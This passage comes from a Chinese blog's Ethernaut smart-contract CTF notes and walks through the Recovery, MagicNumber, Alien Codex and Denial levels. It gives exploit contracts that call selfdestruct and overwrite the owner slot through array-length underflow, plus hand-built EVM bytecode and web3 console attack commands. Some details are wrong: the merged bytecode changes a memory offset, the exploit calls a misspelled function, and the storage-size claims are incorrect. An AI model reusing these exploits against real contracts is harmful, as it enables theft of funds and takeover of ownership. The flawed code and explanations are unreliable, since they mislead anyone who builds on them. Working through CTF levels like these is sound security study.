class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-17"><a href="#合约分析-17" class="headerlink" title="合约分析"></a>合约分析</h5><p>由于在链上所有东西都是透明的，因此合约创建时我们直接查看合约就可以查看到新建立的合约的地址。之后如果要回复token可以借助destory函数来实现，可以构建如下EXP:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract SimpleToken &#123;</span><br><span class="line"></span><br><span class="line">  string public name;</span><br><span class="line">  mapping (address =&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  // constructor</span><br><span class="line">  constructor(string memory _name, address _creator, uint256 _initialSupply) &#123;</span><br><span class="line">    name = _name;</span><br><span class="line">    balances[_creator] = _initialSupply;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // collect ether in return for tokens</span><br><span class="line">  receive() external payable &#123;</span><br><span class="line">    balances[msg.sender] = msg.value * 10;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // allow transfers of tokens</span><br><span class="line">  function transfer(address _to, uint _amount) public &#123; </span><br><span class="line">    require(balances[msg.sender] &gt;= _amount);</span><br><span class="line">    balances[msg.sender] = balances[msg.sender] - _amount;</span><br><span class="line">    balances[_to] = _amount;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // clean up after ourselves</span><br><span class="line">  function destroy(address payable _to) public &#123;</span><br><span class="line">    selfdestruct(_to);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract RecoveryPoc &#123;</span><br><span class="line">    SimpleToken target;</span><br><span class="line">    constructor(address  payable _addr) public&#123;</span><br><span class="line">        target = SimpleToken(_addr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack() public&#123;</span><br><span class="line">      target.destroy(payable(tx.origin));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="攻击流程-16"><a href="#攻击流程-16" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>首先获取一个实例</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105523164.png" alt="image-20240325105523164">从MetaMask上获取交易细节信息</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105550581.png" alt="image-20240325105550581"><br>可以看到代币最后到了<code>0x2f75这段地址</code>由此确定新合约的地址：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105641871.png" alt="image-20240325105641871"><br>之后部署攻击合约</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105704510.png" alt="image-20240325105704510"><br>之后点击hack实施攻击：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105746920.png" alt="image-20240325105746920"><br>之后查看attack之后的交易细节，发现代币找回<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105909730.png" alt="image-20240325105909730"><br>同时发现新合约自动销毁</p>
<p>最后点击”submit instance”提交示例即可：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325105948507.png" alt="image-20240325105948507"></p>
<h3 id="MagicNumber"><a href="#MagicNumber" class="headerlink" title="MagicNumber"></a>MagicNumber</h3><h5 id="闯关条件-6"><a href="#闯关条件-6" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>为了解决这个关卡，你只需要向 Ethernaut 提供一个 Solver，一个用正确的数字响应 WhatIsTheMeaningOfLife() 的合约。</p>
<p>容易吧？ 嗯…有一个问题。</p>
<p>求解器的代码必须非常小。 真的很小。 就像真的非常非常小：最多 10 个操作码。</p>
<p>提示：也许是时候暂时离开 Solidity 编译器的舒适感，并手动构建这个编译器了 O_o。 没错：原始 EVM 字节码。</p>
<p>祝你好运！<br>即要求输出42(操作码为2A)。</p>
<h5 id="合约代码-18"><a href="#合约代码-18" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line">contract MagicNum &#123;</span><br><span class="line">  address public solver;</span><br><span class="line">  constructor() &#123;&#125;</span><br><span class="line">  function setSolver(address _solver) public &#123;</span><br><span class="line">    solver = _solver;</span><br><span class="line">  &#125;</span><br><span class="line">  /*</span><br><span class="line">    ____________/\\\_______/\\\\\\\\\_____        </span><br><span class="line">     __________/\\\\\_____/\\\///////\\\___       </span><br><span class="line">      ________/\\\/\\\____\///______\//\\\__      </span><br><span class="line">       ______/\\\/\/\\\______________/\\\/___     </span><br><span class="line">        ____/\\\/__\/\\\___________/\\\//_____    </span><br><span class="line">         __/\\\\\\\\\\\\\\\\_____/\\\//________   </span><br><span class="line">          _\///////////\\\//____/\\\/___________  </span><br><span class="line">           ___________\/\\\_____/\\\\\\\\\\\\\\\_ </span><br><span class="line">            ___________\///_____\///////////////__</span><br><span class="line">  */</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-18"><a href="#合约分析-18" class="headerlink" title="合约分析"></a>合约分析</h5><p>为了解决这个问题，有 10 个操作码的大小限制，即 10 个字节，因为每个操作码是 1 个字节。因此，我们的求解器最多应有 10 个字节，并且应返回 42 (0x2a)。</p>
<p>我们需要编写两组字节码：</p>
<ol>
<li>初始化字节码：负责准备合约并返回运行时字节码。</li>
<li>运行时字节码：这是合约创建后运行的实际代码。换句话说，这包含了合约的逻辑。</li>
</ol>
<p>让我们首先看一下运行时操作码。我们使用以太坊<a target="_blank" rel="noopener" href="https://ethereum.org/en/developers/docs/evm/opcodes">文档</a>作为操作码参考。</p>
<h6 id="运行时操作码"><a href="#运行时操作码" class="headerlink" title="运行时操作码"></a>运行时操作码</h6><p>我们需要执行以下步骤来创建运行时操作码：</p>
<ol>
<li><p>将我们的值 (0x2a) 推送并存储在内存中</p>
<p>为了存储该值，我们将使用 MSTORE(p, v)，其中<code>p</code>是位置或偏移量，<code>v</code>是值。由于 MSTORE 期望值已经存储在内存中，因此我们需要首先使用 PUSH1(value) 操作码推送它。我们必须推送该值及其在内存中存储的位置，因此，我们需要 2 个 PUSH1 操作码。</p>
<p>复制</p>
<p>复制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 0x60 - PUSH1 --&gt; PUSH(0x2a) --&gt; 0x602a (Pushing 2a or 42)</span><br><span class="line">2. 0x60 - PUSH1 --&gt; PUSH(0x80) --&gt; 0x6080 (Pushing an arbitrary selected memory slot 80)</span><br><span class="line">3. 0x52 - MSTORE --&gt; MSTORE --&gt; 0x52 (Store value p=0x2a at position v=0x80 in memory)</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回存储的值</p>
<p>一旦我们完成了 PUSH 和 MSTORE，就可以使用 RETURN(p, s) 返回值，其中<code>p</code>是存储在内存中的数据的偏移量或位置，<code>s</code>是存储数据的长度&#x2F;大小。因此，我们再次需要 2 个 PUSH1 操作码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 0x60 - PUSH1 --&gt; PUSH(0x20) --&gt; 0x6020 (Size of value is 32 bytes)</span><br><span class="line">2. 0x60 - PUSH1 --&gt; PUSH(0x80) --&gt; 0x6080 (Value was stored in slot 0x80)</span><br><span class="line">3. 0xf3 - RETURN --&gt; RETURN --&gt; 0xf3 (Return value at p=0x80 slot and of size s=0x20)</span><br></pre></td></tr></table></figure></li>
</ol>
<p>我们可以从上述文档中获取字节码的值。我们最终的运行时操作码将是：<code>602a60805260206080f3</code>。</p>
<h6 id="初始化操作码"><a href="#初始化操作码" class="headerlink" title="初始化操作码"></a>初始化操作码</h6><p>我们来看看需要的初始化操作码。这些将负责将我们的运行时操作码加载到内存中并将其返回到 EVM。</p>
<p>要复制代码，我们需要使用 CODECOPY(t, f, s) 操作码，它需要 3 个参数。</p>
<ul>
<li><code>t</code>：代码在内存中的目标偏移量。我们将其保存到 0x00 偏移量。</li>
<li><code>f</code>：这是运行时操作码的当前位置，目前尚不清楚。</li>
<li><code>s</code>：这是运行时代码的大小（以字节为单位），即<code>602a60805260206080f3</code>- 10 字节长。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 0x60 - PUSH1 --&gt; PUSH(0x0a) --&gt; 0x600a (`s=0x0a` or 10 bytes)</span><br><span class="line">2. 0x60 - PUSH1 --&gt; PUSH(0x??) --&gt; 0x60?? (`f` - This is not known yet)</span><br><span class="line">3. 0x60 - PUSH1 --&gt; PUSH(0x00) --&gt; 0x6000 (`t=0x00` - arbitrary chosen memory location)</span><br><span class="line">4. 0x39 - CODECOPY --&gt; CODECOPY --&gt; 0x39 (Calling the CODECOPY with all the arguments)</span><br></pre></td></tr></table></figure>

<p>现在，将运行时操作码返回到 EVM：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 0x60 - PUSH1 --&gt; PUSH(0x0a) --&gt; 0x600a (Size of opcode is 10 bytes)</span><br><span class="line">2. 0x60 - PUSH1 --&gt; PUSH(0x00) --&gt; 0x6000 (Value was stored in slot 0x00)</span><br><span class="line">3. 0xf3 - RETURN --&gt; RETURN --&gt; 0xf3 (Return value at p=0x00 slot and of size s=0x0a)</span><br></pre></td></tr></table></figure>

<p>初始化操作码的字节码将变为<code>600a60__600039600a6000f3</code>总共 12 个字节。这意味着运行时操作码起始位置的缺失值<code>f</code>将是索引 12 或 0x0c，从而形成我们的最终字节码<code>600a600c600039600a6000f3</code>。</p>
<p>一旦我们有了这两个字节码，我们就可以将它们组合起来以获得可用于部署合约的最终字节码。 <code>602a60805260206080f3</code>+ <code>600a600c600039600a6000f3</code>&#x3D;<code>600a600c600039600a6000f3602a60505260206050f3</code></p>
<h5 id="攻击流程-17"><a href="#攻击流程-17" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个实例：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325110702753.png" alt="image-20240325110702753"><br>之后在控制台实施攻击</p>
<p>对于操作码的执行我们需要用转账函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;from:player,data:bytecode&#125;,function(err,res)&#123;console.log(res)&#125;)</span><br></pre></td></tr></table></figure>

<p>这里借鉴了一个writeup(<a target="_blank" rel="noopener" href="https://blog.dixitaditya.com/ethernaut-level-18-magicnumber)%EF%BC%8C%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AF%A6%E7%BB%86%E7%9A%84%E6%8F%8F%E8%BF%B0%EF%BC%8C%E8%AF%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%87%AA%E6%88%91%E5%80%9F%E9%89%B4%EF%BC%8C%E6%9C%80%E5%90%8E%E7%9A%84%E6%94%BB%E5%87%BB%E4%BB%A3%E7%A0%81%E5%A6%82%E4%B8%8B%EF%BC%9A">https://blog.dixitaditya.com/ethernaut-level-18-magicnumber)，里面有详细的描述，读者可以自我借鉴，最后的攻击代码如下：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var bytecode = &quot;0x600a600c600039600a6000f3602A60805260206080f3&quot;; </span><br><span class="line">web3.eth.sendTransaction(&#123;from:player, data:bytecode&#125;, function(err,res)&#123;console.log(res)&#125;); </span><br><span class="line">await contract.setSolver(&quot;0xccb446cbcd073320dfb8487cfcab02aeeb0aeee6&quot;);</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325213642639.png" alt="image-20240325213642639"></p>
<p>最后点击“submit instance”提交示例：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240325213703574.png" alt="image-20240325213703574"></p>
<h3 id="Alien-Codex"><a href="#Alien-Codex" class="headerlink" title="Alien Codex"></a>Alien Codex</h3><h5 id="闯关条件-7"><a href="#闯关条件-7" class="headerlink" title="闯关条件"></a>闯关条件</h5><p>获取合约的所有权。</p>
<h5 id="合约代码-19"><a href="#合约代码-19" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function makeContact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-19"><a href="#合约分析-19" class="headerlink" title="合约分析"></a>合约分析</h5><h6 id="分析合约存储布局"><a href="#分析合约存储布局" class="headerlink" title="分析合约存储布局"></a>分析合约存储布局</h6><p>首先我们要知道，所有 Solidity 状态变量都按顺序保存（动态数组和映射除外）。</p>
<p><code>AlienCodex</code> 合约里有 3 个字段：</p>
<ol>
<li><code>ownable</code> : 继承自Ownable合约（Ownable-05.sol 文件中没有其他任何内容）， 占用 20 字节</li>
<li><code>contact</code> : bool 值， 占用 8 字节</li>
<li><code>codex</code> ： bytes32 数组</li>
</ol>
<p>前 2 个字段（<code>ownable</code> 和 <code>contact</code>）将共享第一个槽，即 0 号插槽。</p>
<p>第三个属性（<code>codex</code>）位于第二个槽中：1。但它是一个动态数组，因此在第二个槽中的值只是数组的长度。要注意的是，数组长度始终为 uint256，因此它始终占用一个完整的槽。</p>
<p>对槽的读取和写入和对变量的操作是一样的。</p>
<p>合约开头 import 了 Ownable 合约，同时也引入了一个 owner 变量。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 0, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">//&#x27;0x0000000000000000000000000bc04aa6aac163a6b3667636d798fa053d43bd11&#x27;</span><br><span class="line">// bool public contact   0x000000000000000000000000</span><br><span class="line">// address public owner  0xbc04aa6aac163a6b3667636d798fa053d43bd11</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326091114740.png" alt="image-20240326091114740"></p>
<p>由于 EVM 存储优化的关系，在 slot [0]中同时存储了contact和owner，需要做的就是将owner变量覆盖为自己。<br>首先通过 make_contact() 函数，我们可以将contact变量设置为 true，这也是调用其他几个函数的前提。<br>之后就是一个经典的 OOB (out of boundary) Attack<br>首先通过调用 retract()，使得 codex 数组长度下溢。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">// codex.length</span><br><span class="line">// 0x0000000000000000000000000000000000000000000000000000000000000000</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">contract.retract()</span><br><span class="line">// codex.length--</span><br><span class="line"></span><br><span class="line">web3.eth.getStorageAt(contract.address, 1, function(x, y) &#123;alert(y)&#125;);</span><br><span class="line">// codex.length</span><br><span class="line">// 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff</span><br></pre></td></tr></table></figure>

<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326091046388.png" alt="image-20240326091046388"></p>
<p>而在Solidity中动态数组内变量的存储位计算方法可以概括为：<br>b[X] &#x3D;&#x3D; SLOAD(keccak256(slot) + X)<br>在本题中，数组 codex 的 slot 为 1，同时也是存储数组长度的地方。<br>于是只要算出在SLOAD的长度为多少，计算SLOAD最后一个数据再加上1就能溢出到最开始那位<br>由  SOLAD[kaccak256(slot)-kaccak256(slot)] &#x3D; b[-kaccak256(slot)]<br>可以知道SOLAD（0） &#x3D; b[-kaccak256(slot)]，在计算机系统里面，一个数的负数就是该数取反加一，然后可以知道。<br> b[-kaccak256(slot)] &#x3D;  b[(kaccak256(slot)~) +1] &#x3D; b[(2^m-1-kaccak256(slot))+1]  这里的m表示存储这个数据的位数，8字节就是64位，于是得出这里的下标应该为  2^256-kaccak256(1)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import sha3</span><br><span class="line">&gt;&gt;&gt; import binascii</span><br><span class="line">&gt;&gt;&gt; def bytes32(i):</span><br><span class="line">&gt;&gt;&gt;     return binascii.unhexlify(&#x27;%064x&#x27;%i)</span><br><span class="line">&gt;&gt;&gt; sha3.keccak_256(bytes32(1)).hexdigest()</span><br><span class="line">&#x27;b10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6&#x27;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; 2**256 - 0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span><br><span class="line">35707666377435648211887908874984608119992236509074197713628505308453184860938</span><br></pre></td></tr></table></figure>

<p>可计算出，codex[35707666377435648211887908874984608119992236509074197713628505308453184860938] 对应的存储位就是 slot 0。 之前提到 slot 0 中同时存储了 contact 和 owner，只需将 owner 替换为 player 地址即可。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x73048cec9010e92c298b016966bde1cc47299df5&quot;</span><br><span class="line">contract.revise(&#x27;35707666377435648211887908874984608119992236509074197713628505308453184860938&#x27;,&#x27;0x000000000000000000000001a61cfd1573fd2207dcb1841cedcb1d5aed4dc155&#x27;)</span><br><span class="line">// 调用 revise()</span><br><span class="line">await contract.owner()</span><br><span class="line">// &quot;0x676ca875027fd9a5bdbd4f1f0380d8f34d8e1cdf&quot;</span><br><span class="line">// Submit instance</span><br></pre></td></tr></table></figure>

<p>或者调用其他合约完成</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.5.0;</span><br><span class="line"></span><br><span class="line">import &#x27;../helpers/Ownable-05.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract AlienCodex is Ownable &#123;</span><br><span class="line"></span><br><span class="line">  bool public contact;</span><br><span class="line">  bytes32[] public codex;</span><br><span class="line"></span><br><span class="line">  modifier contacted() &#123;</span><br><span class="line">    assert(contact);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function makeContact() public &#123;</span><br><span class="line">    contact = true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function record(bytes32 _content) contacted public &#123;</span><br><span class="line">    codex.push(_content);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function retract() contacted public &#123;</span><br><span class="line">    codex.length--;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function revise(uint i, bytes32 _content) contacted public &#123;</span><br><span class="line">    codex[i] = _content;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">contract AlienHack &#123;</span><br><span class="line">  AlienCodex level19;</span><br><span class="line">  constructor(address payable  _addr) &#123;</span><br><span class="line">       level19 =  AlienCodex(_addr);</span><br><span class="line">  &#125;</span><br><span class="line">    function exploit () external &#123;</span><br><span class="line">        uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;</span><br><span class="line">        bytes32 myAddress = bytes32(uint256(uint160(tx.origin)));</span><br><span class="line">        level19.makecontact();</span><br><span class="line">        level19.retract();</span><br><span class="line">        level19.revise(index, myAddress);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="攻击流程-18"><a href="#攻击流程-18" class="headerlink" title="攻击流程"></a>攻击流程</h5><p>获取一个新的实例：<br><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326150041219.png" alt="image-20240326150041219"><br>中间流程参考合约分析部分！最后获得owner之后提交示例即可：</p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326155302365.png" alt="image-20240326155302365"></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326155328836.png" alt="image-20240326155328836"></p>
<p><img src="/picture/ethernaut%E8%AE%AD%E7%BB%83%E7%AC%94%E8%AE%B0/image-20240326155421659.png" alt="image-20240326155421659"></p>
<h3 id="Denial"><a href="#Denial" class="headerlink" title="Denial"></a>Denial</h3><h5 id="闯关要求-12"><a href="#闯关要求-12" class="headerlink" title="闯关要求"></a>闯关要求</h5><p>造成DOS使得合约的owner在调用withdraw时无法正常提取资产。</p>
<h5 id="合约代码-20"><a href="#合约代码-20" class="headerlink" title="合约代码"></a>合约代码</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">import &#x27;openzeppelin-solidity/contracts/math/SafeMath.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Denial &#123;</span><br><span class="line"></span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    address public partner; // withdrawal partner - pay the gas, split the withdraw</span><br><span class="line">    address public constant owner = 0xA9E;</span><br><span class="line">    uint timeLastWithdrawn;</span><br><span class="line">    mapping(address =&gt; uint) withdrawPartnerBalances; // keep track of partners balances</span><br><span class="line"></span><br><span class="line">    function setWithdrawPartner(address _partner) public &#123;</span><br><span class="line">        partner = _partner;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // withdraw 1% to recipient and 1% to owner</span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        uint amountToSend = address(this).balance.div(100);</span><br><span class="line">        // perform a call without checking return</span><br><span class="line">        // The recipient can revert, the owner will still get their share</span><br><span class="line">        partner.call.value(amountToSend)();</span><br><span class="line">        owner.transfer(amountToSend);</span><br><span class="line">        // keep track of last withdrawal time</span><br><span class="line">        timeLastWithdrawn = now;</span><br><span class="line">        withdrawPartnerBalances[partner] = withdrawPartnerBalances[partner].add(amountToSend);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // allow deposit of funds</span><br><span class="line">    function() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    // convenience function</span><br><span class="line">    function contractBalance() view returns (uint) &#123;</span><br><span class="line">        return address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="合约分析-20"><a href="#合约分析-20" class="headerlink" title="合约分析"></a>合约分析</h5><p>从合约的代码中我们很容易发现这里存在一个重入漏洞，所以可以通过部署了一个利用重入漏洞的合约，把gas直接消耗光，那么owner 自然收不到钱了，从而造成DOS。</p>
<p>攻击合约如下：</p>
